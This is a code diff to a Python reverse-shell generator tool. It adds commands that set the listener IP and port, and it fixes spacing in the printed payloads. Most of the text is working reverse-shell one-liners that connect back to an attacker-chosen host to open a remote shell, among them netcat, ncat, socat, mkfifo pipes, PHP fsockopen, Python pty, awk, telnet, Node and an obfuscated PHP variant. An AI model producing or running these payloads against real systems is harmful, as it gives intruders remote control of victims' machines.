@@ -52,8 +52,11 @@ def guide():
     print("exit                                                     = exit")
     print("clear                                                    = clear the screen\n")
     print("ifconfig                                                 = to get the ipv4 address of your system")
-    print("ls                                                       = list the reverse-shell and listners")
-    print("example:-")
+    print("set lhost                                                = to set or change the ip address")
+    print("set lport                                                = to set or change the listing port number")
+    print("show                                                     = to print the lhost and lport")
+    print("rsg -h                                                   = list the reverse-shell and listners")
+    print("example:-\n")
     print("{:30s} {:30s}".format("rsg listner 4", "rsg reverse-shell 19\n\n"))
 
 
@@ -183,7 +186,7 @@ while True:
         
         
     elif take == "rsg reverse-shell 8":
-        print("\n\nrequire('child_process').exec('nc -e sh "+ip+"\t"+port+"')\n\n")
+        print("\n\nrequire('child_process').exec('nc -e sh "+ip+" "+port+"')\n\n")
     elif take == "rsg reverse-shell 9":
         print("""\n\nphp -r '$ð="1";$ð="2";$ð="3";$ð="4";$ð="5";$ð="6";$ð="7";$ð="8";$ð="9";$ð="0";$ð¤¢=" ";$ð¤="<";$ð¤ =">";$ð±="-";$ðµ="&";$ð¤©="i";$ð¤=".";$ð¤¨="/";$ð¥°="a";$ð="b";$ð¶="i";$ð="h";$ð="c";$ð¤£="d";$ð="e";$ð="f";$ð="k";$ð="n";$ð="o";$ð="p";$ð¤="s";$ð="x";$ð = $ð. $ð¤. $ð. $ð. $ð. $ð. $ð. $ð. $ð;$ð = " \b"""+ip+""" ";$ð» = """+port+""";$ð = "sh". $ð¤¢. $ð±. $ð¤©. $ð¤¢. $ð¤. $ðµ. $ð. $ð¤¢. $ð¤ . $ðµ. $ð. $ð¤¢. $ð. $ð¤ . $ðµ. $ð;$ð¤£ =  $ð($ð,$ð»);$ð½ = $ð. $ð. $ð. $ð;$ð½($ð);' \n\n""")    
     elif take == "rsg reverse-shell 10":
@@ -205,15 +208,15 @@ while True:
 <script>document.getElementById("cmd").focus();</script>
 </html> \n\n""")  
     elif take == "rsg reverse-shell 11":
-        print("""\n\nnc -e sh """+ip+"""\t"""+port+"""\n\n""")
+        print("""\n\nnc -e sh """+ip+""" """+port+"""\n\n""")
     elif take == "rsg reverse-shell 12":
-        print("\n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc "+ip+"\t"+port+" >/tmp/f\n\n")
+        print("\n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc "+ip+" "+port+" >/tmp/f\n\n")
     elif take == "rsg reverse-shell 13":
-        print("\n\nnc.exe -e sh "+ip+"\t"+port+"\n\n")
+        print("\n\nnc.exe -e sh "+ip+" "+port+"\n\n")
     elif take == "rsg reverse-shell 14":
-        print("\n\nnc -c sh "+ip+"\t"+port+"\n\n")
+        print("\n\nnc -c sh "+ip+" "+port+"\n\n")
     elif take == "rsg reverse-shell 15":
-        print("\n\nnc -c sh "+ip+"\t"+port+"\n\n")
+        print("\n\nnc -c sh "+ip+" "+port+"\n\n")
     elif take == "rsg reverse-shell 16":
         print("""\n\nphp -r '$sock=fsockopen(" \b"""+ip+""" \b","""+port+""");exec("sh <&3 >&3 2>&3");'\n\n""")
     elif take == "rsg reverse-shell 17":
@@ -225,9 +228,9 @@ while True:
     elif take == "rsg reverse-shell 20":
         print("""\n\nphp -r '$sock=fsockopen(" \b"""+ip+""" \b","""+port+""");$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'\n\n""")
     elif take == "rsg reverse-shell 21":
-        print("\n\nncat "+ip+"\t"+port+" -e sh\n\n")
+        print("\n\nncat "+ip+" "+port+" -e sh\n\n")
     elif take == "rsg reverse-shell 22":
-        print("\n\nncat.exe "+ip+"\t"+port+" -e sh\n\n")
+        print("\n\nncat.exe "+ip+" "+port+" -e sh\n\n")
     elif take == "rsg reverse-shell 23":
         print("""\n\nawk 'BEGIN {s = "/inet/tcp/0/"""+ip+"""/"""+port+""" \b";\n
  while(42)\n
@@ -242,7 +245,7 @@ while True:
     while(c != "exit") close(s);\n
      }}' /dev/null\n\n""")
     elif take == "rsg reverse-shell 24":
-        print("\n\nrcat "+ip+"\t"+port+" -r sh\n\n")
+        print("\n\nrcat "+ip+" "+port+" -r sh\n\n")
     elif take == "rsg reverse-shell 25":
         print("\n\nsocat TCP:"+ip+":"+port+" EXEC:'sh',pty,stderr,setsid,sigint,sane\n\n")
     elif take == "rsg reverse-shell 26":
@@ -266,7 +269,7 @@ $client.Close()\n\n""")
     elif take == "rsg reverse-shell 28":
         print("""\n\npython3 -c 'import os,pty,socket;s=socket.socket();s.connect((" \b"""+ip+""" \b","""+port+"""));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'\n\n""")
     elif take == "rsg reverse-shell 29":
-        print("\n\nTF=$(mktemp -u);mkfifo $TF && telnet "+ip+"\t"+port+" 0<$TF | sh 1>$TF\n\n")
+        print("\n\nTF=$(mktemp -u);mkfifo $TF && telnet "+ip+" "+port+" 0<$TF | sh 1>$TF\n\n")
     elif take == "rsg reverse-shell 30":
         print("""\n\nimport os,socket,subprocess,threading;\n
 def s2p(s, p):\n
@@ -301,7 +304,18 @@ except KeyboardInterrupt:\n
     elif take == "show":
         print("IP-Address            :"+ip)
         print("Listning port number  :"+port)
+    
+    elif take == "set lhost":
+        newip = input("Enter the ip address\n")
+        ip = ip.replace(ip , newip)
+        print("lhost        :"+ip)
+        print("lport        :"+port)
         
+    elif take == "set lport":
+        newport = input("Enter the listing port number")
+        port = port.replace(port , newport)
+        print("lport        :"+port)
+        print("lhost        :"+ip)
     
         
     elif take == "exit":
